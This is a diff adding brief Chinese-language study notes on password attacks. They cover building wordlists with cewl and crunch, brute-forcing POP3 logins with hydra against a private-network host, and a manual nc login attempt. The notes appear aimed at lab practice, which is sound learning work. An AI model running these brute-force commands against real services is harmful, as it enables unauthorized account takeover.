@@ -1,0 +1,19 @@
+1 字典
+  使用ceWL定制词汇
+  cewl -w passwords.txt -d 1 -m 5 wwww.abc.com
+  链接深度为1 最小长度为5 
+  
+  Crunch 密码穷举
+  crunch 7 7 AB
+  产生7位的AB密码
+  
+2 使用 Hydra 猜用户名及密码
+  hydra -L userlist.txt -P password.txt 192.168.20.10 pop3
+  hydra -l admin -P password.txt 192.168.20.10 pop3
+  
+  nc 192.168.20.10 pop3
+  USER admin
+  PASS password
+  
+  
+  
